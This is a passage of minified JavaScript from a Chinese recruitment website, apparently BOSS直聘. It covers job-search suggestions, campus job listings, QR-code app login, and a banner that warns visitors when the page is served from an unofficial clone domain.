                $.each(e, function(e, t) {
                    var i = a(window.location.href, {
                        query: encodeURIComponent(t.name)
                    });
                    n += '<li><a href="' + i + '" title="' + t.name + '">' + t.hlname + "</a></li>"
                }),
                d.append(n)) : (d.empty(),
                d.append('<span class="empty-tip">暂无推荐数据</span>')),
                c.removeClass("hide")
            }
        }) : 1 === e.length ? (d.empty(),
        d.append('<span class="empty-tip">暂无推荐数据</span>'),
        c.removeClass("hide")) : (d.empty(),
        c.addClass("hide"))
    }
    function i() {
        var e = a(window.location.href, {
            query: encodeURIComponent(filterXss(l.val()))
        });
        window.location.href = e
    }
    var n, o, s, r = $(".job-search-ipt"), c = r.find(".job-search-ipt-options"), l = r.find(".job-search-ipt-inner"), d = r.find(".job-search-ipt-options-cont"), e = r.find(".job-search-btn");
    r.on("click", function() {
        r.addClass("active"),
        t(l.val())
    }),
    l.on("input", (n = 300,
    o = function(e) {
        t(l.val())
    }
    ,
    function() {
        var e = this
          , t = arguments;
        clearTimeout(s),
        s = setTimeout(function() {
            o.apply(e, t)
        }, n)
    }
    )),
    r.on("clickout", function(e) {
        r.removeClass("active"),
        c.addClass("hide")
    }),
    e.on("click", function(e) {
        i()
    }),
    l.keyup(function(e) {
        13 === e.which && i()
    })
}),
$(function() {
    "school_zhejiangbwgw" == $("#page_key_name").val() && ($(".city-dropdown-sel").on("click", ".city-dropdown-list li", function() {
        var e = $(this).data("city")
          , t = $.trim($(this).text() || "");
        $(this).addClass("active").siblings().removeClass("active"),
        $(this).closest(".city-dropdown-sel").find(".label-text b").text(t),
        $(this).closest("form").find("input[name=city]").val(e)
    }),
    $(".common-tab-box.school-hotrecruitment").off("click"),
    $(".school-hotrecruitment").on("click", "h3 span, .school-hotrecruitment-type span", function() {
        $(this).addClass("cur").siblings().removeClass("cur");
        var e = $(this).closest(".school-hotrecruitment").find(".school-hotrecruitment-type")
          , t = $(this).closest(".school-hotrecruitment").find("h3").not(".section-title")
          , i = $(this).parents(".school-hotrecruitment").find("ul.cur")
          , n = $(this).parents(".school-hotrecruitment").find(".common-tab-more a")
          , e = $("span.cur", e).data("type")
          , t = $("span.cur", t).data("city")
          , a = getQueryString("experience") || 102;
        n.attr("href", "/web/geek/job?query=&city=" + t + "&experience=" + a),
        $.ajax({
            type: "get",
            data: {
                jobType: e,
                city: t
            },
            url: "/wapi/zpgeek/schoolrecruit/bwgw/joblist.json",
            success: function(e) {
                0 == e.code && e.zpData && (e = function(e) {
                    if (!(e || []).length)
                        return "";
                    var i = "";
                    return $.each(e || [], function(e, t) {
                        i += ["<li>", '<div class="sub-li">', '<a href="/job_detail/' + (t = (t = t) || {}).encryptJobId + '.html" class="job-info" target="_blank" ka="school__' + t.encryptJobId + '_click">', '<p><span class="title-text">' + (t.jobName || "") + '</span><span class="salary">' + (t.salaryDesc || "") + "</span></p>", '<p class="job-text">' + (t.cityName || "") + '<span class="vline"></span>' + (t.jobExperience || "") + '<span class="vline"></span>' + (t.jobDegree || "") + "</p>", '</a><a href="/gongsi/' + t.encryptBrandId + '.html" class="user-info" target="_blank">', '<p><img src="' + t.brandLogo + '" data-src="' + t.brandLogo + '" alt="">' + (t.brandName || ""), '<span class="user-text"></span>', "</p></a></div>", "</li>"].join("")
                    }),
                    i
                }(e.zpData.jobList || []),
                i.html(e))
            }
        })
    }))
}),
$(function() {
    var t = !1
      , i = null
      , a = {}
      , e = $(".sign-wrap-v2 .sign-quick");
    function n(e, t, i) {
        var n = e[t];
        Object.defineProperty(e, t, {
            enumerable: !0,
            configurable: !0,
            get: function() {
                return n
            },
            set: function(e) {
                i(n = e)
            }
        })
    }
    e.length && (e.prepend('<span class="switch-login-btn app-way" ka="change_login_way_app"></span>'),
    e.on("click", ".switch-login-btn", function() {
        $(this).hasClass("app-way") ? ($(this).removeClass("app-way").attr("ka", "change_login_way_sms"),
        function() {
            var e = $.Deferred();
            t && window.BossLogin ? e.resolve() : seriesLoadScripts("https://www.zhipin.com/v2/boss_login/v1.0.0/js/boss-login.min.js", function() {
                t = !0,
                e.resolve()
            });
            return e
        }().then(function() {
            a = new window.BossLogin.BossAppScan;
            e.find("form").hide(),
            (i = $(['<div class="app-login-wrapper">', '<div class="qr-img-box"><i class="iboss-loading"></i></div>', '<div class="login-step-box"></div>', "</div>"].join("")).appendTo(e)).find(".login-step-box").hide(),
            n(a, "refreshIng", function(e) {
                e ? i.find(".qr-img-box").html('<i class="iboss-loading"></i>').show().siblings().hide() : (i.find(".qr-img-box i").remove(),
                e = "/wapi/zpweixin/qrcode/getqrcode?content=" + a.uuid,
                i.find(".qr-img-box").html('<img src="' + e + '" class="qr-code" />').show().siblings().hide())
            }),
            n(a, "secondUuid", function(e) {
                e && (e = "/wapi/zpweixin/qrcode/getqrcode?content=" + e,
                i.find(".qr-img-box .qr-code").attr("src", e))
            }),
            n(a, "scaned", function(e) {
                e && (e = ['<div class="user-photo"><img src=" ' + a.headImg + ' " /></div>', '<div class="login-step-text"><h3 class="login-step-title">' + (a.loginTipTitle || "") + "</h3></div>", a.loginTipMessage ? '<p class="login-step-detail">' + a.loginTipMessage + "</p>" : ""],
                i.find(".login-step-box").html(e.join("")).show().siblings().hide())
            }),
            n(a, "isExpired", function(e) {
                e && (e = $(['<div class="qrcode-invalid-box"><p>请重新刷新二维码</p>', '<button class="btn-refresh" ka="refresh_app_sao_qrcode">点击刷新</button>', "</div>"].join("")).appendTo(i.find(".qr-img-box")),
                i.find(".qr-img-box").show().siblings().hide(),
                e.on("click", ".btn-refresh", function() {
                    a.refreshQRcode()
                }))
            }),
            a.on("login-limit", function(e) {
                Sign.loginLimitTip(e.code, {
                    message: e.message,
                    closeCallback: function() {
                        a.refreshQRcode()
                    }
                })
            }),
            a.on("get-head-fail", function(e) {
                $.toast({
                    type: "error",
                    content: e && e.message || "获取头像失败"
                })
            }),
            a.on("login-fail", function(e) {
                e = e || {},
                $.dialog({
                    title: "提示",
                    type: "error",
                    content: e.message || "登录失败",
                    closeText: !0,
                    cancelText: "",
                    confirmText: "知道了",
                    wrapClass: "dialog-prop-default",
                    onClose: function(e) {
                        e.remove(),
                        a.refreshQRcode()
                    }
                })
            }),
            a.on("login-success", function() {
                $.toast({
                    type: "success",
                    content: "登录成功"
                }),
                setTimeout(function() {
                    window.location.reload()
                }, 500)
            })
        })) : ($(this).addClass("app-way").attr("ka", "change_login_way_app"),
        i && i.remove(),
        $.each(["refreshIng", "scaned", "isExpired", "secondUuid"], function(e, t) {
            var i, n;
            n = (i = a)[t = t],
            delete i[t],
            i[t] = n
        }),
        a.destroy && a.destroy(),
        a = {},
        e.find("form").show())
    }))
}),
!function() {
    var e, t, i, n, a, o = window.location.hostname;
    -1 < ["127.0.0.1", "0.0.0.0", "localhost", "www.zpurl.cn", "zpurl.cn", "www.insiderspy.net", "insiderspy.net", "www.spyinsider.cn", "spyinsider.cn", "insdier.net"].indexOf(o) || (t = 0 <= o.indexOf("kanzhun.com") || 0 <= o.indexOf("bosszhipin.com") || 0 <= o.indexOf(".zhipin.com") || 0 <= o.indexOf("nnhfg.com") || 0 <= o.indexOf("dianzhangzhipin.com") || 0 <= o.indexOf(".weizhipin.com"),
    e = function(e) {
        t = {
            ca: "site-rpt-blk"
        },
        n = document.referrer || "",
        i = window.location.href,
        a(t, "prevUrl", n),
        a(t, "hostname", o),
        a(t, "url", i);
        var t, i, n = t;
        function a(e, t, i) {
            i && (e[t] = i)
        }
        _T.config({
            domain: "t.zhipin.com"
        }),
        window._T && "function" == typeof _T.loadImg && _T.loadImg("/f.gif", n)
    }
    ,
    t || (t = function() {
        e()
    }
    ,
    (a = document.getElementById("black-website-tip")) || ($first = document.body.firstChild,
    (a = document.createElement("div")).id = "black-website-tip",
    a.style.cssText = "opacity: 1!important;display:block!important;margin:0!important;position:fixed !important;z-index:9999!important;left:0 !important;right: 0!important;top:0 !important;bottom: unset !important;background-color:rgb(226 197 79 / 90%) !important;font-size:14px!important;font-weight:bold!important;min-height:50px;padding: 10px;line-height: 30px;text-align:center!important;transform: translateY(-100%);transition:transform .5s linear;box-sizing:border-box;",
    a.textContent = "请您注意：当前网站非BOSS直聘官方网站，可能存在虚假招聘的问题，请您谨慎在当前网站填写个人信息，尤其是敏感个人信息，谨防上当受骗。如您有求职需求，请您登录BOSS直聘官网网站：",
    (i = document.createElement("a")).href = "https://www.zhipin.com/",
    i.setAttribute("ka", "from-black-site"),
    i.setAttribute("target", "_blank"),
    i.style.cssText = "color: #00C2B3;",
    i.textContent = "www.zhipin.com",
    a.appendChild(i),
    $first.parentNode.insertBefore(a, $first),
    n = setTimeout(function() {
        a.style.setProperty("transform", "translateY(0)", "important"),
        clearTimeout(n),
        n = null
    }, 1e3),
    t && t())))
}();
